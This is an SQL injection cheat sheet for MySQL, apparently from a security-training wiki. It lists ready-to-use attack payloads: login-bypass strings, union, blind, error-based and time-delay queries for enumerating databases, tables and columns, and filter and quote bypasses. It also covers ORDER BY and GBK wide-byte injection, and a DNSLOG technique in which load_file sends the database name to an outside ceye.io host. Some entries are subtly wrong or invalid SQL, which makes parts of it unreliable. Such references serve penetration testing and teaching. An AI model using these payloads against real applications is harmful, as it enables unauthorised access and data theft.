# SQL Injection

## Basic Concepts

-   SQL injection is an attack that inserts or appends SQL code into application (user) input parameters, which are then passed to the backend SQL server for parsing and execution.
-   Attackers can modify SQL statements, and the process will have the same permissions as the component executing the command (such as the database server, application server, or web server).
-   SQL injection vulnerabilities typically occur when web application developers fail to validate values received from web forms, cookies, input parameters, etc. before passing them to SQL queries executed on the database server.

## Common Tools

-   Burp Suite: [Burp Suite Usage Guide](http://drops.xmd5.com/static/drops/tools-1548.html)
-   Tamper Data (Firefox addon)
-   HackBar (Firefox addon)
-   sqlmap: [sqlmap User Manual](http://drops.xmd5.com/static/drops/tips-143.html)

## Common Injection Parameters

-   `user()`: Current database user
-   `database()`: Current database name
-   `version()`: Current database version
-   `@@datadir`: Database data storage path
-   `concat()`: Concatenate data, used to combine two data results. e.g., `concat(username,0x3a,password)`
-   `group_concat()`: Similar to `concat()`, e.g., `group_concat(DISTINCT+user,0x3a,password)`, used to extract multiple rows of data in a single injection
-   `concat_ws()`: Similar usage
-   `hex()` and `unhex()`: Used for hex encoding and decoding
-   `load_file()`: Read a file as text. On Windows, paths use `\\`
-   `select xxoo into outfile 'path'`: Can write files directly with sufficient privileges

## Syntax Reference and Tips

### Line Comments

-   `--`

    ```sql
    DROP sampletable;--
    ```

-   `#`

    ```sql
    DROP sampletable;#
    ```

### Inline Comments

-   `/*comment*/`

    ```sql
    DROP/*comment*/sampletable`   DR/**/OP/*bypass filtering*/sampletable`   SELECT/*replace space*/password/**/FROM/**/Members
    ```

-   `/*! MySQL-specific */`

    ```sql
    SELECT /*!32302 1/0, */ 1 FROM tablename
    ```

### String Encoding

-   `ASCII()`: Returns the ASCII value of a character
-   `CHAR()`: Converts an integer to the corresponding character

## Universal Backend Passwords

-   `admin' --`
-   `admin' #`
-   `admin'/*`
-   `' or 1=1--`
-   `' or 1=1#`
-   `' or 1=1/*`
-   `') or '1'='1--`
-   `') or ('1'='1--`
-   Log in as a different user: `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

## Injection Statement Cheat Sheet

### Database Name

```sql
SELECT database();
SELECT schema_name FROM information_schema.schemata;
```

### Table Name

-   Union query

    ```sql
    --Use version=9 for MySQL 4, version=10 for MySQL 5
    UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   /* List tables in the current database */
    UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* List tables in all user-defined databases */
    SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
    ```

-   Blind injection

    ```sql
    AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
    ```

-   Error-based

    ```sql
    AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
    -- Successful in version 5.1.5.
    ```

### Column Name

-   Union query

    ```sql
    UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
    ```

-   Blind injection

    ```sql
    AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
    ```

-   Error-based

    ```sql
    -- Successful in version 5.1.5
    AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)
    -- Fixed in MySQL 5.1
    AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
    ```

-   Using `PROCEDURE ANALYSE()`

    ```sql
    -- This requires the web display page to have a field from your injected query
    -- Get the first field name
    SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()
    -- Get the second field name
    1 LIMIT 1,1 PROCEDURE ANALYSE()
    -- Get the third field name
    1 LIMIT 2,1 PROCEDURE ANALYSE()
    ```

### Find Table by Column Name

```sql
-- Query tables with a column named username
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
-- Query tables with column names containing username
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```

### Bypassing Quote Restrictions

```sql
-- Hex encoding
SELECT * FROM Users WHERE username = 0x61646D696E
-- char() function
SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)
```

### Bypassing String Blacklists

```sql
SELECT 'a' 'd' 'mi' 'n';
SELECT CONCAT('a', 'd', 'm', 'i', 'n');
SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
```

When using `CONCAT()`, if any argument is null, it will return null. It is recommended to use `CONCAT_WS()`. The first argument of `CONCAT_WS()` specifies the separator character for the query results.

### Conditional Statements

`CASE`, `IF()`, `IFNULL()`, `NULLIF()`.

```sql
SELECT IF(1=1, true, false);
SELECT CASE WHEN 1=1 THEN true ELSE false END;
```

### Delay Functions

`SLEEP()`, `BENCHMARK()`.

```sql
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
```

### Injection After ORDER BY

Since `order by` is a sorting statement, conditional statements can be used for inference, determining whether a condition is true or false based on different sorting results. Variables containing `order` or `order by` are likely candidates for this type of injection. When one field is known, the following method can be used:

Original URL: `http://www.test.com/list.php?order=vote`

Sorting by the `vote` field. Find the maximum vote count `num`, then construct the following URL:

```
http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc
```

Check whether the sorting changes. Another method that doesn't require knowing any field information uses the `rand` function:

```
http://www.test.com/list.php?order=rand(true)
http://www.test.com/list.php?order=rand(false)
```

The above two will return different orderings. The statement to determine whether the first character of the table name is less than 128:

```
http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
```

### Wide Byte Injection

GBK encoding is the most commonly used encoding in China. This technique is mainly used to bypass the escaping of special characters by functions like `addslashes`. The hexadecimal value of the backslash `\` is `%5c`. When you input `%bf%27`, the function encounters the single quote and automatically adds a `\` for escaping, resulting in `%bf%5c%27`. In GBK encoding, `%bf%5c` becomes a wide character "縗". The byte at the `%bf` position can be any character between `%81-%fe`. Wide byte injection is applicable not only in SQL injection but also in many other contexts.

### DNSLOG Injection

**DNS leaves logs during resolution. By reading the resolution logs of multi-level domain names, information can be obtained. In simple terms, information is placed in a higher-level domain name, transmitted to yourself, and then the logs are read to obtain the information.**

DNSLOG platform: [http://ceye.io/](http://ceye.io/)

```
mysql> use security;
Database changed

mysql> select load_file('\\\\test.xxx.ceye.io\\abc');
+-------------------------------------------+
| load_file('\\\\test.xxx.ceye.io\\abc') |
+-------------------------------------------+
| NULL                                      |
+-------------------------------------------+
1 row in set (22.05 sec)

mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
+----------------------------------------------------------------------+
| load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc')) |
+----------------------------------------------------------------------+
| NULL                                                                 |
+----------------------------------------------------------------------+
1 row in set (0.00 sec)
```
![](./php/figure/preg_match/sqli1.png)

## References

-   [SQL Injection Cheat Sheet](http://drops.xmd5.com/static/drops/tips-7840.html)
-   [MySQL Injection Tips](http://drops.xmd5.com/static/drops/tips-7299.html)
-   [MySQL Injection Primer](http://drops.xmd5.com/static/drops/tips-123.html)
-   [MySQL Injection Summary](http://www.91ri.org/4073.html)
-   ["SQL Injection Attacks and Defense"](http://product.dangdang.com/23364650.html)
